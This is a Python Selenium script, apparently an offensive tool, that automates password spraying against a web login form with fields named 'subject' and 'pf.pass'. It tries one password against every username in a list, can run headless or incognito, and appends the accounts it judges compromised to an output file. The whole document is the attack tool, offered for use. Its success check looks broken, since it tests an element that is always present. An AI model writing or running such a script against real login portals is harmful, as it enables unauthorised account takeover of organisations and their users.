from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import argparse

def spray_users(username, url, password, output_file, incognito, headless):
    options = Options()
    if incognito:
        options.add_argument("--incognito")
    if headless:
        options.add_argument("--headless")

    with webdriver.Chrome(options=options) as driver:
        driver.get(url)
        username_input = driver.find_element_by_name('subject')
        username_input.send_keys(username)
        # Trigger the postOk function using execute_script
        try:
            driver.execute_script("""
                try {
                    postOk();
                } catch (error) {
                    console.error(error);
                }
            """)
        except Exception as e:
            print(f"Exception: {e}")

        time.sleep(3)
        try:
            password_input = driver.find_element_by_name('pf.pass')
            password_input.send_keys(password)
            time.sleep(3)
            print(f'[*] Spraying The User : {username} !')
            try:
                driver.execute_script("""
                    try {
                        postOk();
                    } catch (error) {
                        console.error(error);
                    }
                """)
                if password_input:
                    print(f'[-] The User: {username} With The Password: {password} did not Pwned')
                else:
                    print(f'[+] Seems like The User {username} is Pwned!')
                    f = open(output_file, "a")
                    f.write(username + "\n")
                    f.close()
            except Exception as e:
                print(f"Exception: did not Logged in {e}")
            time.sleep(3)
        except Exception as e:
            print(f'[-] The User: {username} did not logged in')
        driver.quit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="URL to check the users")
    parser.add_argument("--output", required=True, help="Path to the output file for valid sprayed users")
    parser.add_argument("--password", required=True, help="Password to use for spraying")
    parser.add_argument("--users", required=True, help="Path to the input user file")
    parser.add_argument("--incognito", action='store_true', help="Enable incognito mode for the browser")
    parser.add_argument("--headless", action='store_true', help="Enable headless mode for the browser")
    args = parser.parse_args()

    with open(args.users, 'r') as file:
        for line in file:
            spray_users(line.strip(), args.url, args.password, args.output, args.incognito, args.headless)
